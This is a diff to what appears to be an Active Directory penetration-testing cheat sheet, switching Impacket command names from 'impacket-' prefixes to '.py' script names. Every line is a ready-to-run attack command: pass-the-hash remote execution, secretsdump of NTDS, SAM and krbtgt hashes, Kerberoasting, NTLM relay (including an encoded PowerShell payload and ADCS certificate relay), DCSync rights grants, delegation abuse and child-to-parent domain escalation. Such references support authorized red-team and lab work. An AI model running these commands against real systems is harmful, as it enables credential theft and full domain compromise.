@@ -80,18 +80,18 @@ proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 secretsdump.py -k -outputfile "$DOMAIN" "$DC_HOST"
 rpcdump.py @"$IP" | egrep 'MS-RPRN|MS-PAR'
-impacket-mssqlclient "$USER":"$PASSWORD"@"$IP" -p 1433
-impacket-mssqlclient -p 1433 "$USER"@"$IP" -windows-auth
-impacket-mssqlclient "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+mssqlclient.py "$USER":"$PASSWORD"@"$IP" -p 1433
+mssqlclient.py -p 1433 "$USER"@"$IP" -windows-auth
+mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
 GetNPUsers.py -dc-ip "$IP" "$DOMAIN/" -usersfile "$USERLIST" -format hashcat -outputfile asreproast.txt
 GetNPUsers.py -usersfile "$USERLIST" -request -format hashcat -outputfile asrep.txt -dc-ip "$IP" -no-pass "$DOMAIN/$USER"
 GetUserSPNs.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request
 GetUserSPNs.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request -outputfile kerb.txt
 psexec.py "$DOMAIN/$USER"@"$IP" -hashes :"$NT_HASH"
-impacket-psexec administrator:"$PASSWORD"@"$IP"
-impacket-psexec "$DOMAIN"/"$USER"@"$IP" -hashes :"$NT_HASH"
-impacket-wmiexec "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
-impacket-dcomexec -object MMC20 "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+psexec.py administrator:"$PASSWORD"@"$IP"
+psexec.py "$DOMAIN"/"$USER"@"$IP" -hashes :"$NT_HASH"
+wmiexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+dcomexec.py -object MMC20 "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
 getTGT.py "$DOMAIN/$USER:$PASSWORD" -dc-ip "$IP"
 getTGT.py "$DOMAIN/$USER" -hashes :"$NT_HASH" -dc-ip "$IP"
 getST.py "$DOMAIN/$USER" -impersonate "$TARGET_USER" -dc-ip "$IP" -spn "CIFS/DC"
@@ -103,17 +103,15 @@ secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$TARGET_USER"
 secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$DOMAIN"/krbtgt
 secretsdump.py -k -no-pass "$DOMAIN/$USER@DC" -dc-ip "$IP" -target-ip "$IP"
 secretsdump.py -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$IP"
-impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
-impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
-impacket-ntlmrelayx -smb2support -t smb://"$IP"
-impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
-impacket-ntlmrelayx --no-http-server -smb2support -t "$IP"
-impacket-ntlmrelayx --no-http-server -smb2support -t "$IP" -c 'powershell -e "$BASE64"'
-impacket-ntlmrelayx -t ldap://"$IP" --delegate-access --escalate-user "$USER"
-impacket-ntlmrelayx -t ldaps://"$IP" -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
-impacket-ntlmrelayx -6 -t ldaps://"$IP" -wh wpad."$DOMAIN" -l loot
-impacket-ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template DomainController
-impacket-ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+ntlmrelayx -smb2support -t smb://"$IP"
+ntlmrelayx -tf relay_targets.txt -smb2support -i
+ntlmrelayx --no-http-server -smb2support -t "$IP"
+ntlmrelayx --no-http-server -smb2support -t "$IP" -c 'powershell -e "$BASE64"'
+ntlmrelayx -t ldap://"$IP" --delegate-access --escalate-user "$USER"
+ntlmrelayx -t ldaps://"$IP" -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
+ntlmrelayx -6 -t ldaps://"$IP" -wh wpad."$DOMAIN" -l loot
+ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template DomainController
+ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
 dacledit.py -action read -dc-ip "$IP" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
 dacledit.py -action write -rights DCSync -principal "$USER" -target-dn 'DC=domain,DC=local' "$DOMAIN/$USER:$PASSWORD"
@@ -128,17 +126,16 @@ rbcd.py -delegate-to "$TARGET\$" -dc-ip "$IP" -action read "$DOMAIN/$USER:$PASSW
 getST.py "$DOMAIN/$COMPUTER_NAME$" -spn "cifs/$TARGET" -impersonate "$ADMIN_USER" -dc-ip "$IP"
 getST.py -self -impersonate Administrator -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$IP" "$DOMAIN/$TARGET\$"
 renameMachine.py -current-name "$COMPUTER_NAME$" -new-name "$TARGET" -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
-impacket-secretsdump -no-pass -just-dc "$TARGET\$@$IP"
 lookupsid.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
 lookupsid.py "$DOMAIN/$USER:$PASSWORD"@"$IP" | grep "Domain SID"
 raiseChild.py -target-exec "$TARGET" "$DOMAIN/$USER"
 secretsdump.py -just-dc-ntlm "$DOMAIN/$DUMMY_USER@$TARGET" -k -no-pass -target-ip "$TARGET"
 findDelegation.py -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
-impacket-psexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
-impacket-wmiexec "$DOMAIN/$USER:$PASSWORD"@"$IP" "$COMMAND"
-impacket-dcomexec -object MMC20 "$DOMAIN/$USER:$PASSWORD"@"$IP"
-impacket-atexec -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
-impacket-mssqlclient "$DOMAIN/$USER:$PASSWORD"@"$IP"
-impacket-mssqlclient "$USER@$IP" -windows-auth
-proxychains impacket-psexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
-proxychains impacket-wmiexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
+psexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+wmiexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP" "$COMMAND"
+dcomexec.py -object MMC20 "$DOMAIN/$USER:$PASSWORD"@"$IP"
+atexec.py -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
+mssqlclient.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+mssqlclient.py "$USER@$IP" -windows-auth
+proxychains psexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+proxychains wmiexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
